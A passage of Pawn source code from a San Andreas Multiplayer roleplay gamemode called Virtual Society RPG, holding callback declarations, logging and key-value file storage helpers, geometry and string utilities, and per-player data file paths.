	//{2920,	2,	1544.6845,	-1630.9524,		13.1828,	90.0,	0.0,	179.3906}
};

//Veiculos
new VFuelText[MAX_SLOTS] = 0;
new VHealthText[MAX_SLOTS] = 0;
new VFrozenFlags[MAX_SLOTS] = 0;

//Velocímetro
new Float:VCoords[MAX_SLOTS][2];

//Forwards
forward Text:CreateDrawText(content[], colour, style);
forward DrawTextForPlayer(playerid, content[], colour, style, time);
forward DrawTextForPlayers(content[], colour, style, time, ...);
forward DrawTextForAll(content[], colour, style, time);
forward DrawCustomTextForPlayer(playerid, content[], colour, Float:X, Float:Y, font, Float:sizeX, Float:sizeY, shadow, alignment, time);
forward HideTextDraw(textid, playerid);
forward DestroyTextDraw(textid, playerid);
forward TakeObject(objectid);
forward StopAnimation(playerid);
forward Introducing(playerid);
forward StartChat(playerid);
forward ContinueFromLastPos(playerid);
forward SolveTextBlack(playerid, alpha);
forward DissolveTextBlack(playerid, alpha);
forward DissolveTextWhite(playerid, alpha);
forward ShowTextRed(playerid);
forward HideTextRed(playerid);
forward ShowTextGray(playerid);
forward HideTextGray(playerid);
forward ShowTextLightGray(playerid);
forward HideTextLightGray(playerid);
forward LicenseTestT();
forward LicenseTestN();
forward LicenseTestA();
forward CheckTestT();
forward DamageAnimation(playerid, Float:damage);
forward DamageAnimationGetUp(playerid, getupid);
forward DamageEnd(playerid);
forward Limping(playerid);
forward StartDie(playerid);
forward Fall(playerid, spawn);
forward Die(playerid, spawn);
forward Saving(playerid, plid);
forward StartPlayingDiscoSong(songid);
forward StartPlayingFunkSong(songid);
forward RestartDance(playerid);
forward RestartStripTease(playerid);
forward CreateDroppedWeapon(weaponid, ammo, Float:X, Float:Y, Float:Z, Float:rX, Float:rY, Float:rZ);
forward DeleteDroppedWeapon(id);
forward CreateExplosionT(Float:X, Float:Y, Float:Z, type, Float:radius);
forward ExplodeBomb(objectid, Float:X, Float:Y, Float:Z);
forward ExplodeApproxBomb(objectid, Float:X, Float:Y, Float:Z, count);
forward GasEffect(objectid, Float:X, Float:Y, Float:Z);
forward FlashEffect(objectid, Float:X, Float:Y, Float:Z);
forward RocketEffect(objectid, Float:X, Float:Y, Float:Z, stage);
forward SpeakRadio(playerid, speakid);
forward Speak(playerid, speak[]);
forward AttackTerritory(playerid);
forward GangZoneWar(zoneid);
forward SetGateParams(gateid, params);
forward OpenGate(gateid);
forward CloseGate(gateid);
forward SetPlayerCellPhoneAction(playerid);
forward StopPlayerCellPhoneAction(playerid);
forward PhoneCall(playerid);
forward PhoneCallStop(playerid, callerid);
forward PhoneCallError(playerid, errno);
forward TakePickup(pickupid);
forward Update();
forward KeyHandler();
forward Hour();
forward ServerWarning();
forward Time();
forward Speedometer();
forward Gasometer();
forward ZeroRadarFlags(playerid);
forward Fishery(playerid);
forward Taxi(playerid, plid, vehicleid, textid);
forward Assaulting(playerid, textid);
forward Fueling(playerid, vehicleid, start, amount, textid);
forward Repairing(playerid, vehicleid, value, textid);
forward Planting(playerid);
forward Milking(playerid);
forward CheckingSmugglingCar(playerid);
forward WaitingLimo(playerid, action);
forward LoadingTruck(playerid);
forward BusStop(playerid);
forward DiscoDJ();
forward FunkDJ();
forward PlacingBodies();
forward UnloadingCement();
forward FixingPost();
forward Resume(playerid);
forward GeneralHandler();
forward GateHandler();
forward VoteKick();
forward StartTimer(id);
forward StartGameModeExit(seconds);
forward TurnGameModeOff(textend);

//Callbacks
forward OnPlayerEnterPlace(playerid, enter, int);
forward OnPlayerExitPlace(playerid, enter, int);
forward OnPlayerPressedKey(playerid, key, up_down, left_right);

#if USE_UCP == true

forward HTTPResponse(index, response_code, data[]);
forward HTTPCheck();

#endif

main()
{
	print("\n");
	print("-----------------------------------------------------------------");
	print("---------------------- Virtual Society RPG ----------------------");
	print("-------- Copyright(C) 2010/2012 The Virtual Society Team --------");
	print("---------------------- All Rights Reserved ----------------------");
	print("-----------------------------------------------------------------");
	print("\n\7");
}

stock operator%(Float:oper1, Float:oper2)
{
	return floatround(oper1, floatround_floor) % floatround(oper2, floatround_floor);
}

stock operator%(oper1, Float:oper2)
{
	return oper1 % floatround(oper2, floatround_floor);
}

stock operator%(Float:oper1, oper2)
{
	return floatround(oper1, floatround_floor) % oper2;
}

stock report(const string[], report_type = REPORT_DEFAULT)
{
	new File:log;
	new msg[128], time[32];
	new colour, hour, minute, second, day, month, year;
	
	gettime(hour, minute, second);
	getdate(year, month, day);
	format(time, sizeof time, "[%s - %s] ", ToDate(day, month, year), ToTime(hour, minute, second));
	
 	if(report_type == REPORT_DEFAULT)
	{
	    format(msg, sizeof msg, "[REPORT]-> %s", string);
	    colour = COLOUR_REPORT_DEFAULT;
	}
    
	else if(report_type == REPORT_CHAT)
	{
	    logcreate("Chat", CHAT_REPORT_FILE_PATH);
	    log = fopen(CHAT_REPORT_FILE_PATH, io_append);
	    fwrite(log, time);
	   	fwrite(log, string);
	   	fwrite(log, "\r\n");
	   	fclose(log);
	   	print(string);
	   	return;
	}

	else if(report_type == REPORT_ACTION)
	{
	    logcreate("Action's", ACTION_REPORT_FILE_PATH);
	    log = fopen(ACTION_REPORT_FILE_PATH, io_append);
	    fwrite(log, time);
	   	fwrite(log, string);
	   	fwrite(log, "\r\n");
	   	fclose(log);
		   	
    	format(msg, sizeof msg, "[ACTION REPORT]-> %s", string);
	    colour = COLOUR_REPORT_ACTION;
	}
	
	else if(report_type == REPORT_PAY)
	{
	    logcreate("Pay's", PAY_REPORT_FILE_PATH);
	    log = fopen(PAY_REPORT_FILE_PATH, io_append);
	    fwrite(log, time);
	   	fwrite(log, string);
	   	fwrite(log, "\r\n");
	   	fclose(log);

    	format(msg, sizeof msg, "[PAY REPORT]-> %s", string);
	    colour = COLOUR_REPORT_PAY;
	}
	
	else if(report_type == REPORT_CONNECTION)
	{
	    logcreate("Connection's", CONNECTION_REPORT_FILE_PATH);
	    log = fopen(CONNECTION_REPORT_FILE_PATH, io_append);
	    fwrite(log, time);
	   	fwrite(log, string);
	   	fwrite(log, "\r\n");
	   	fclose(log);
		return;
	}
	
#if USE_UCP == true

    else if(report_type == REPORT_UCP)
	{
	    logcreate("UCP", UCP_REPORT_FILE_PATH);
	    log = fopen(UCP_REPORT_FILE_PATH, io_append);
	    fwrite(log, time);
	   	fwrite(log, string);
	   	fwrite(log, "\r\n");
	   	fclose(log);
		return;
	}
	
#endif

	for(new n = 0; n < MAX_SLOTS; n++)
	{
	    if(IsPlayerConnected(n) && IsPlayerAdmin(n) && !AdminData[n][admReportOff])
	        SendClientMessage(n, colour, msg);
	}
}

stock hSetString(const filename[], const key[], const value[])
{
    new File:fpr, File:fpw;
    new read[128], buf[128];
	new bool:wrote;
    
	if(!fexist(filename))
	{
	    fpw = fopen(filename, io_write);
	    fclose(fpw);
	}
	
	format(buf, sizeof buf, "%s.buf", filename);
	fremove(buf);

	fpw = fopen(buf, io_write);
	fpr = fopen(filename, io_read);
	
	while(fread(fpr, read, sizeof read))
	{
	    new hkey[128], index;
	    
	    index = 0;
	    hkey = strtok(read, index, HSYS_SEP_CHAR);
	    
		if(strcmp(key, hkey, true) == 0)
		{
		    if(!wrote)
      		{
		    	new wtext[128];
		    	format(wtext, sizeof wtext, "%s%c%s\r\n", key, HSYS_SEP_CHAR, value);
		    	fwrite(fpw, wtext);
   			}
			
			wrote = true;
		}
		
		else
		    fwrite(fpw, read);
	}
	
	if(!wrote)
 	{
	    new wtext[128];
    	format(wtext, sizeof wtext, "%s%c%s\r\n", key, HSYS_SEP_CHAR, value);
    	fwrite(fpw, wtext);
 	}
	
	fclose(fpr);
	fclose(fpw);
	
#if USE_UCP == true

	HTTPUpdateFile(filename);
	
#endif

	if(fcopytextfile(buf, filename))
		return fremove(buf);

	return false;
}

stock hGetString(const filename[], const key[])
{
    new File:fp;
	new read[128], ret[128];
	
	ret[0] = 0;
	
    if(!fexist(filename))
		return ret;
	
	fp = fopen(filename, io_read);
	
	while(fread(fp, read, sizeof read))
	{
		new hkey[128];
		new index;
		
		index = 0;
		hkey = strtok(read, index, HSYS_SEP_CHAR);
		
		if(strcmp(key, hkey, true) == 0)
		{
			fclose(fp);
			
			while(read[index] == HSYS_SEP_CHAR)
				++index;
				
			strmid(ret, read, index, strlen(read));
			StripNewLine(ret);
			return ret;
		}
	}
	
	fclose(fp);
	return ret;
}

stock hUnset(const filename[], const key[])
{
	new File:fpr, File:fpw;
	new buf[128], read[128];
	
    if(!fexist(filename))
	{
	    fpw = fopen(filename, io_write);
	    fclose(fpw);
	}
	
	format(buf, sizeof buf, "%s.buf", filename);
	fremove(buf);
	
	fpw = fopen(buf, io_write);
	fpr = fopen(filename, io_read);
	
	while(fread(fpr, read, sizeof read))
	{
	    new hkey[128], index;
	    
	    index = 0;
	    hkey = strtok(read, index, HSYS_SEP_CHAR);
	    
		if(strcmp(key, hkey, true) != 0)
		    fwrite(fpw, read);
	}
	
	fclose(fpr);
	fclose(fpw);
	
#if USE_UCP == true

	HTTPUpdateFile(filename);

#endif

	if(fcopytextfile(buf, filename))
		return fremove(buf);
		
	return false;
}

stock hSetInt(const filename[], const key[], value)
{
	new stringize[128];
	format(stringize, sizeof stringize, "%d", value);
	return hSetString(filename, key, stringize);
}

stock hGetInt(const filename[], const key[])
	return strval(hGetString(filename, key));

stock hSetFloat(const filename[], const key[], Float:value)
{
	new stringize[128];
	format(stringize, sizeof stringize, "%f", value);
	return hSetString(filename, key, stringize);
}

stock Float:hGetFloat(const filename[], const key[])
	return floatstr(hGetString(filename, key));

// ------------ Functions by DracoBlue ------------ //
stock StripNewLine(string[])
{
	new len = strlen(string);
	if (string[0]==0) return ;
	if ((string[len - 1] == '\n') || (string[len - 1] == '\r')) {
		string[len - 1] = 0;
		if (string[0]==0) return ;
		if ((string[len - 2] == '\n') || (string[len - 2] == '\r')) string[len - 2] = 0;
	}
}

stock fcopytextfile(const oldname[], const newname[]) {
	new File:ohnd,File:nhnd;
	if (!fexist(oldname)) return false;
	ohnd=fopen(oldname,io_read);
	nhnd=fopen(newname,io_write);
	new tmpres[128];
	while (fread(ohnd,tmpres)) {
		StripNewLine(tmpres);
		format(tmpres,sizeof(tmpres),"%s\r\n",tmpres);
		fwrite(nhnd,tmpres);
	}
	fclose(ohnd);
	fclose(nhnd);
	return true;
}

stock strtok(const string[], &index, seperator=' ')
{
	new length = strlen(string);
	new offset = index;
	new result[128];
	while ((index < length) && (string[index] != seperator) && ((index - offset) < (sizeof(result) - 1)))
	{
		result[index - offset] = string[index];
		index++;
	}
	result[index - offset] = EOS;
	if ((index < length) && (string[index] == seperator))
	{
		index++;
	}
	return result;
}
// --------------------------------------------- //

// ------------ Functions by Y_Less ------------ //
stock GetXYInFrontOfPlayer(playerid, &Float:x, &Float:y, Float:distance)
{
    new Float:a;
    GetPlayerPos(playerid, x, y, a);
    GetPlayerFacingAngle(playerid, a);
    if (GetPlayerVehicleID(playerid))
	{
        GetVehicleZAngle(GetPlayerVehicleID(playerid), a);
    }
    x += (distance * floatsin(-a, degrees));
    y += (distance * floatcos(-a, degrees));
}

stock GetXYInBackOfPlayer(playerid, &Float:x, &Float:y, Float:distance)
{
    new Float:a;
    GetPlayerPos(playerid, x, y, a);
    GetPlayerFacingAngle(playerid, a);
    if (GetPlayerVehicleID(playerid))
	{
        GetVehicleZAngle(GetPlayerVehicleID(playerid), a);
    }
    a = (a + 180) % 360;
    x += (distance * floatsin(-a, degrees));
    y += (distance * floatcos(-a, degrees));
}

stock GetXYInRightOfPlayer(playerid, &Float:x, &Float:y, Float:distance)
{
    new Float:a;
    GetPlayerPos(playerid, x, y, a);
    GetPlayerFacingAngle(playerid, a);
    if (GetPlayerVehicleID(playerid))
	{
        GetVehicleZAngle(GetPlayerVehicleID(playerid), a);
    }
    a = (a + 270) % 360;
    x += (distance * floatsin(-a, degrees));
    y += (distance * floatcos(-a, degrees));
}

stock GetXYInLeftOfPlayer(playerid, &Float:x, &Float:y, Float:distance)
{
    new Float:a;
    GetPlayerPos(playerid, x, y, a);
    GetPlayerFacingAngle(playerid, a);
    if (GetPlayerVehicleID(playerid))
	{
        GetVehicleZAngle(GetPlayerVehicleID(playerid), a);
    }
    a = (a + 90) % 360;
    x += (distance * floatsin(-a, degrees));
    y += (distance * floatcos(-a, degrees));
}
// ---------------------------------------------- //

// ------------ Function by kyeman ------------ //
stock PreloadAnimLib(playerid, animlib[])
{
	ApplyAnimation(playerid, animlib, "null", 0.0, 0, 0, 0, 0, 0, 1);
}
// --------------------------------------------- //

stock logcreate(const logname[], const logpath[])
{
	if(!fexist(logpath))
	{
	    new File:fp;
	    new string[1024];

	    format(string, sizeof string,   "%s/*\r\n",                                                                                         		string);
		format(string, sizeof string,   "%s *                	Virtual Society RPG %s Log\r\n",                                        			string, logname);
		format(string, sizeof string,   "%s *\r\n",                                                                                         		string);
		format(string, sizeof string,   "%s *  Esse arquivo é parte do Virtual Society RPG, você pode realizar buscas pelas\r\n",           		string);
		format(string, sizeof string,   "%s *  datas utilizando ctrl+F e as digitando no formato dd/MM/YY ou hh:mm:ss.\r\n",                		string);
		format(string, sizeof string,   "%s *  Caso este arquivo for deletado, ele será recriado devido as necessidades do\r\n",            		string);
		format(string, sizeof string,   "%s *  servidor, mudanças no mesmo não irão causar problemas.\r\n",                                 		string);
		format(string, sizeof string,   "%s *\r\n",                                                                                         		string);
		format(string, sizeof string,   "%s *      	Copyright(C) 2010/2012 The Virtual Society Team\r\n",                               			string);
		format(string, sizeof string,   "%s *          			All Rights Reserved\r\n",                                               			string);
		format(string, sizeof string,   "%s *\\\r\n\r\n", 																							string);
	    
	    fp = fopen(logpath, io_write);
		fwrite(fp, string);
	    fclose(fp);
	}
}

stock fcreate(const filename[])
{
	if(!fexist(filename))
	{
	    new File:fp;
	    fp = fopen(filename, io_write);
	    fclose(fp);
	}
}

stock IsVehicleInArea(vehicleid, Float:minX, Float:minY, Float:maxX, Float:maxY)
{
    new Float:X, Float:Y, Float:Z;
    
    GetVehiclePos(vehicleid, X, Y, Z);
    
    if(X >= minX && X <= maxX && Y >= minY && Y <= maxY)
		return true;
		
    return false;
}

stock CheckAng(playerid, Float:ang)
{
	new Float:A;
	
    if(IsPlayerInAnyVehicle(playerid))
		GetVehicleZAngle(GetPlayerVehicleID(playerid), A);

	else
		GetPlayerFacingAngle(playerid, A);

	if(A >= ang - 5.0 && A <= ang + 5.0)
		return true;

    return false;
}

stock IsNumeric(const string[])
{
	for(new n = 0; n < strlen(string); n++)
	{
		if(string[n] < '0' || string[n] > '9')
		    return false;
	}

	return true;
}

#if TEXTDRAW_USE_ACCENT == false

stock TextDrawString(const text[])
{
	new string[128];
	new len;

	len = strlen(text);
	for(new i = 0; i < len; i++)
	{
	    switch(text[i])
	    {
			case 192..197: string[i] = 'A';
			case 200..203: string[i] = 'E';
			case 204..207: string[i] = 'I';
			case 210..214: string[i] = 'O';
			case 217..220: string[i] = 'U';
	        case 224..229: string[i] = 'a';
	        case 232..235: string[i] = 'e';
	        case 236..239: string[i] = 'i';
	        case 242..246: string[i] = 'o';
	        case 249..252: string[i] = 'u';
	        case 199: string[i] = 'C';
	        case 231: string[i] = 'c';
	        default: string[i] = text[i];
	    }
	}

	string[len] = '\0';
	return string;
}

#else

// ------------ Function by ??????? ------------ //
stock TextDrawString(const text[])
{
	new string[128];
	new len;

	len = strlen(text);
	for(new i = 0; i < len; i++)
	{
	    string[i] = text[i];
	    
	    switch(text[i])
	    {
			case 192..196: string[i] -= 64;
			case 199..208: string[i] -= 66;
			case 210..214: string[i] -= 68;
			case 217..223: string[i] -= 71;
	        case 224..228: string[i] -= 73;
	        case 231..239: string[i] -= 75;
	        case 242..246: string[i] -= 77;
	        case 249..252: string[i] -= 80;
	    }
	}

	string[len] = '\0';
	return string;
}
// --------------------------------------------- //

#endif

#if SHOW_GAMEMODE_LOGO == true

stock ShowLogoForPlayer(playerid)
	TextDrawShowForPlayer(playerid, tdlogo);
	
stock HideLogoForPlayer(playerid)
	TextDrawHideForPlayer(playerid, tdlogo);
	
#else

stock ShowLogoForPlayer(playerid)
{
    #pragma unused playerid
}

stock HideLogoForPlayer(playerid)
{
	#pragma unused playerid
}

#endif

#if SHOW_WEEKDAY == true

stock ShowWeekdayForPlayer(playerid)
	TextDrawShowForPlayer(playerid, tdweek);

stock HideWeekdayForPlayer(playerid)
	TextDrawHideForPlayer(playerid, tdweek);

#else

stock ShowWeekdayForPlayer(playerid)
{
    #pragma unused playerid
}

stock HideWeekdayForPlayer(playerid)
{
	#pragma unused playerid
}

#endif

stock StringizeChar(c)
{
	new str[2];
	format(str, sizeof str, "%c\0", c);
	return str;
}

stock GetKeyName(key, onfoot)
{
	new knames[19][32];
	new res[128];
	new bool:first;

    res[0] = '\0';
	first = false;
	
    if(key == 0)
	    return res;
	    
	if(onfoot)
	{
	    knames[0] 		=  		("~k~~PED_ANSWER_PHONE~");
	    knames[1] 		=  		("~k~~PED_DUCK~");
	    knames[2] 		=  		("~k~~PED_FIREWEAPON~");
	    knames[3] 		=  		("~k~~PED_SPRINT~");
	    knames[4] 		=  		("~k~~VEHICLE_ENTER_EXIT~");
	    knames[5] 		=  		("~k~~PED_JUMPING~");
	    knames[7] 		=  		("~k~~PED_LOCK_TARGET~");
	    knames[9] 		=		("~k~~PED_LOOKBEHIND~");
	    knames[10] 		= 		("~k~~SNEAK_ABOUT~");
	    knames[13] 		= 		("~k~~VEHICLE_LOOKLEFT~");
	    knames[14] 		= 		("~k~~VEHICLE_LOOKRIGHT~");
	    knames[16]      =       ("~k~~CONVERSATION_YES~");
	    knames[17]      =       ("~k~~CONVERSATION_NO~");
	    knames[18]      =       ("~k~~GROUP_CONTROL_BWD~");
	}
	
	else
	{
	    knames[0] 		=  		("~k~~VEHICLE_FIREWEAPON~");
	    knames[1] 		=  		("~k~~VEHICLE_HORN~");
	    knames[2] 		=  		("~k~~VEHICLE_FIREWEAPON~");
	    knames[3] 		=  		("~k~~VEHICLE_ACCELERATE~");
	    knames[4] 		=  		("~k~~VEHICLE_FIREWEAPON_ALT~");
	    knames[5] 		=  		("~k~~VEHICLE_BRAKE~");
	    knames[6] 		=  		("~k~~VEHICLE_LOOKRIGHT~");
	    knames[7] 		=  		("~k~~VEHICLE_HANDBRAKE~");
	    knames[8] 		=  		("~k~~VEHICLE_LOOKLEFT~");
	    knames[9] 		=		("~k~~TOGGLE_SUBMISSIONS~");
	    knames[11] 		= 		("~k~~VEHICLE_TURRETUP~");
	    knames[12] 		= 		("~k~~VEHICLE_TURRETDOWN~");
	    knames[13] 		= 		("~k~~VEHICLE_TURRETLEFT~");
	    knames[14] 		= 		("~k~~VEHICLE_TURRETRIGHT~");
	    knames[16]      =       ("~k~~CONVERSATION_YES~");
	    knames[17]      =       ("~k~~CONVERSATION_NO~");
	    knames[18]      =       ("~k~~GROUP_CONTROL_BWD~");
	}

	for(new k = 0; k < 19; k++)
	{
	    if(strlen(knames[k]) > 0 && ((key >> k) & 0x1))
	    {
	        if(!first)
	        {
	            first = true;
	            format(res, sizeof res, "%s", knames[k]);
	        }
	        
	        else
				format(res, sizeof res, "%s + %s", res, knames[k]);
	    }
	}
	
	return res;
}

stock GetNumKeys(key)
{
	new knum;
	
	if(key == 0)
	    return 0;
	    
	knum = 0;

	while(key != 0)
	{
	    if(key & 0x1)
	        knum++;
	        
		key >>= 1;
	}
	
	return knum;
}

stock PressedKey(key, nkey, okey)
{
	if(key == 0)
	    return 0;
	    
	if(GetNumKeys(key) == 1)
	    return ((nkey & key) && !(okey & key));
	    
	return ((nkey | okey) & key) == key;
}

stock ToDate(day, month, year)
{
	new date[64];
	
	if(day < 10)
	    format(date, sizeof date, "0%d/", day);
	    
	else
	    format(date, sizeof date, "%d/", day);
	    
	if(month < 10)
	    format(date, sizeof date, "%s0%d/%d", date, month, year);
	    
	else
	    format(date, sizeof date, "%s%d/%d", date, month, year);
	    
	return date;
}

stock ToTime(hour, minute, second)
{
    new time[64];

	if(hour < 10)
	    format(time, sizeof time, "0%d:", hour);

	else
	    format(time, sizeof time, "%d:", hour);
	    
    if(minute < 10)
	    format(time, sizeof time, "%s0%d", time, minute);

	else
	    format(time, sizeof time, "%s%d", time, minute);

	if(second > -1)
	{
		if(second < 10)
		    format(time, sizeof time, "%s:0%d", time, second);
	    
		else
		    format(time, sizeof time, "%s:%d", time, second);
	}
	
	return time;
}

stock NumericToRoman(number)
{
	new Romans[][16] = {
	    " ",		"I",		"II",		"III",
		"IV",		"V",		"VI",		"VII",
		"VIII",		"IX",		"X",		"XI",
		"XII",		"XIII",		"XIV",		"XV",
		"XVI",		"XVII",		"XVIII",	"XIX",
		"XX",       "XXI",      "XXII",     "XXIII",
		"XXIV",     "XXV",      "XXVI",     "XXVII",
		"XXVIII",   "XXIX",		"XXX",		"XXXI",
		"XXXII",    "XXXIII",   "XXXIV",    "XXXV",
		"XXXVI",    "XXXVII",   "XXXVIII",  "XXXIX",
		"XL",     	"XLI",    	"XLII",   	"XLIII",
		"XLIV",   	"XLV",    	"XLVI",   	"XLVII",
		"XLVIII", 	"XLIX",   	"L"
	};
	
	if(number < 0 || number > sizeof Romans - 1)
	    number = 0;
	    
	return Romans[number];
}

stock IsValidPlayerName(const string[])
{
	for(new n = 0; n < strlen(string); n++)
	{
	    if((string[n] < 'a' || string[n] > 'z') && (string[n] < 'A' || string[n] > 'Z') && (string[n] < '0' || string[n] > '9') && string[n] != '[' && string[n] != ']' && string[n] != '_' && string[n] != '.')
			return false;
	}
	
	return true;
}

stock IsNotSpecialString(const string[])
{
	for(new n = 0; n < strlen(string); n++)
	{
		if((string[n] < 'a' || string[n] > 'z') && (string[n] < 'A' || string[n] > 'Z') && (string[n] < '0' || string[n] > '9') && string[n] != '_' && string[n] != ' ' && string[n] != ''')
			return false;
	}
	
	return true;
}

stock GetPlayerId(const playername[])
{
	new name[MAX_PLAYER_NAME];
	
	for(new n = 0; n < MAX_SLOTS; n++)
	{
	    if(IsPlayerConnected(n) && IsPlayerLogged(n))
	    {
	        GetPlayerName(n, name, MAX_PLAYER_NAME);
	        
	        if(strcmp(name, playername, true) == 0)
	            return n;
	    }
	}
	
	return INVALID_PLAYER_ID;
}

stock GetPlayerWorldPos(playerid, &Float:X, &Float:Y, &Float:Z)
{
    if(House[playerid] != -1)
    {
     	new Float:A;
     	
     	LoadHousePos(House[playerid], X, Y, Z, A);
     	return;
    }

	if(Enter[playerid] != -1)
	{
	    X = Enters[Enter[playerid]][enterX];
	    Y = Enters[Enter[playerid]][enterY];
	    Z = Enters[Enter[playerid]][enterZ];
	    return;
	}
	
	GetPlayerPos(playerid, X, Y, Z);
}

stock Float:GetDistance(Float:X1, Float:Y1, Float:Z1, Float:X2, Float:Y2, Float:Z2)
	return floatsqroot(		floatpower(X1 - X2, 2) +
							floatpower(Y1 - Y2, 2) +
							floatpower(Z1 - Z2, 2)	);

stock Float:GetDistance2D(Float:X1, Float:Y1, Float:X2, Float:Y2)
{
    return floatsqroot(		floatpower(X1 - X2, 2) +
							floatpower(Y1 - Y2, 2)  );
}

stock GetPlayerInt(playerid)
{
	if(Enter[playerid] == -1)
		return -1;
		
	return Enters[Enter[playerid]][intId];
}

stock GetPlayerSafe(playerid)
{
	for(new c = 1; c < sizeof Safes; c++)
	{
	    if(Safes[c][sEnter] == Enter[playerid])
	        return c;
	}
	
	return -1;
}

stock GetSafePoint(safe)
{
	new int;
	
	int = Enters[Safes[safe][sEnter]][intId];
	
	for(new cp = 0; cp < sizeof SafePoints; cp++)
	{
	    if(SafePoints[cp][safepointInt] == int)
	        return cp;
	}
	
	return -1;
}

stock PlayerName(playerid)
{
	new name[MAX_PLAYER_NAME];
	GetPlayerName(playerid, name, sizeof name);
	return name;
}

stock GetPlayerNameXFilePath(const playername[])
{
    new xpath[128];
	format(xpath, sizeof xpath, #SERVER_DIRECTORY "Players/Data1/%s.ini", playername);
	return xpath;
}

stock GetPlayerXFilePath(playerid)
{
	new xpath[128], name[MAX_PLAYER_NAME];
	GetPlayerName(playerid, name, sizeof name);
	format(xpath, sizeof xpath, #SERVER_DIRECTORY "Players/Data1/%s.ini", name);
	return xpath;
}

stock GetPlayerNameKFilePath(const playername[])
{
    new xpath[128];
	format(xpath, sizeof xpath, #SERVER_DIRECTORY "Players/Data2/%s.ini", playername);
	return xpath;
}

stock GetPlayerKFilePath(playerid)
{
	new kpath[128], name[MAX_PLAYER_NAME];
	GetPlayerName(playerid, name, sizeof name);
	format(kpath, sizeof kpath, #SERVER_DIRECTORY "Players/Data2/%s.ini", name);
	return kpath;
}

stock GetPlayerNameMFilePath(const playername[])
{
    new xpath[128];
	format(xpath, sizeof xpath, #SERVER_DIRECTORY "Players/Data3/%s.ini", playername);
	return xpath;
}

stock GetPlayerMFilePath(playerid)
{
	new kpath[128], name[MAX_PLAYER_NAME];
	GetPlayerName(playerid, name, sizeof name);
	format(kpath, sizeof kpath, #SERVER_DIRECTORY "Players/Data3/%s.ini", name);
	return kpath;
}

stock GetVehicleFilePath(vehicleid)
{
	new vpath[128];
	
	vpath[0] = '\0';
	
	for(new v = 0; v < sizeof VehicleId; v++)
	{
	    if(VehicleId[v] == vehicleid)
	        format(vpath, sizeof vpath, #SERVER_DIRECTORY "World/Vehicles/%d.veh", v);
	}
	
	return vpath;
}

stock GetSysVehicleFilePath(vehicleid)
{
	new vpath[128];
	format(vpath, sizeof vpath, #SERVER_DIRECTORY "World/Vehicles/%d.veh", vehicleid);
	return vpath;
}

stock GetGangFilePath(gangid)
{
    new gpath[128];
	format(gpath, sizeof gpath, #SERVER_DIRECTORY "World/Gangs/%d.gng", gangid);
	return gpath;
}

stock GetHouseFilePath(houseid)
{
	new hpath[128];
	format(hpath, sizeof hpath, #SERVER_DIRECTORY "World/Houses/%d.hse", houseid);
	return hpath;
}

stock GetCompanyFilePath(company)
{
	new cpath[128];
	format(cpath, sizeof cpath, #SERVER_DIRECTORY "World/Companies/%s.pro", Companies[company][cFile]);
	return cpath;
}

stock GetCompanyNameFilePath(const company[])
{
	new cpath[128];
	format(cpath, sizeof cpath, #SERVER_DIRECTORY "World/Companies/%s.pro", company);
	return cpath;
}

stock GetVehicleForSaleId(vehicleid)
{
    for(new vfs = 0; vfs < sizeof VehiclesForSale; vfs++)
	{
	    if(VehiclesForSale[vfs][osVehId] == vehicleid)
	        return vfs;
	}

	return -1;
}

stock IsVehicleForSale(vehicleid)
{
	for(new vfs = 0; vfs < sizeof VehiclesForSale; vfs++)
	{
	    if(VehiclesForSale[vfs][osVehId] == vehicleid)
	        return 1;
	}
	
	return 0;
}

stock IsServerVehicle(vehicleid)
	return (vehicleid < MaxServerVeh);

stock IsPlayerVehicle(vehicleid)
	return (!IsVehicleForSale(vehicleid) && vehicleid >= MaxServerVeh);

stock FuncIsJobVehicle(vehicleid, array[], size)
{
    for(new n = 0; n < size; n++)
	{
	    if(vehicleid == array[n])
	        return true;
	}

	return false;
}

stock FuncGetJobVehicle(vehicleid, array[], size)
{
    for(new n = 0; n < size; n++)
	{
	    if(vehicleid == array[n])
	        return n;
	}

	return -1;
}

stock FuncIsPlayerInJobVehicle(playerid, array[], size)
{
    if(!IsPlayerInAnyVehicle(playerid))
	    return false;
	    
	for(new n = 0; n < size; n++)
	{
	    if(IsPlayerInVehicle(playerid, array[n]))
	        return true;
	}
	
	return false;
}

stock FuncGetPlayerJobVehicle(playerid, array[], size)
{
	if(!IsPlayerInAnyVehicle(playerid))
	    return -1;
	    
	for(new n = 0; n < size; n++)
	{
	    if(IsPlayerInVehicle(playerid, array[n]))
	        return n;
	}

	return -1;
}

stock SetVehiclesParamsForPlayer(array[], size, playerid, objective, doorslocked)
{
	for(new n = 0; n < size; n++)
	    SetVehicleParamsForPlayer(array[n], playerid, objective, doorslocked);
}

stock SendClientMessageToJob(jobid, colour, const string[])
{
	new File:log;
	new msg[128], time[32];
	new hour, minute, second, day, month, year;

	gettime(hour, minute, second);
	getdate(year, month, day);
	format(time, sizeof time, "[%s - %s] ", ToDate(day, month, year), ToTime(hour, minute, second));
	
	for(new n = 0; n < MAX_SLOTS; n++)
	{
		if(IsPlayerConnected(n) && IsPlayerLogged(n))
		{
			if((IsPlayerAdmin(n) && !AdminData[n][admReportOff]) || hGetInt(GetPlayerXFilePath(n), "Job") == jobid)
			    SendClientMessage(n, colour, string);
		}
	}
	
	logcreate("Jobs", JOBS_REPORT_FILE_PATH);
	log = fopen(JOBS_REPORT_FILE_PATH, io_append);
	format(msg, sizeof msg, "<%s> %s", Jobs[jobid][jobName], string);
	fwrite(log, time);
	fwrite(log, msg);
	fwrite(log, "\r\n");
	fclose(log);
}

stock SendClientMessageToPolice(colour, const string[])
{
	new File:log;
	new msg[128], time[32];
	new jobid, hour, minute, second, day, month, year;
	
	gettime(hour, minute, second);
	getdate(year, month, day);
	format(time, sizeof time, "[%s - %s] ", ToDate(day, month, year), ToTime(hour, minute, second));
	format(msg, sizeof msg, "[INFO] %s", string);
	
	for(new n = 0; n < MAX_SLOTS; n++)
	{
		if(IsPlayerConnected(n) && IsPlayerLogged(n))
		{
			jobid = hGetInt(GetPlayerXFilePath(n), "Job");
			
			if((IsPlayerAdmin(n) && !AdminData[n][admReportOff]) || jobid == JOB_POLICE || jobid == JOB_SWAT || jobid == JOB_DELEGATE)
			    SendClientMessage(n, colour, msg);
		}
	}
	
	logcreate("Police", POLICE_REPORT_FILE_PATH);
	log = fopen(POLICE_REPORT_FILE_PATH, io_append);
	fwrite(log, time);
	fwrite(log, string);
	fwrite(log, "\r\n");
	fclose(log);
	   	
}

stock ChangePlayerJob(playerid, jobid)
{
	if(jobid > 0 && jobid < sizeof Jobs)
	{
	    new admin;

		admin = IsPlayerAdmin(playerid);
	    
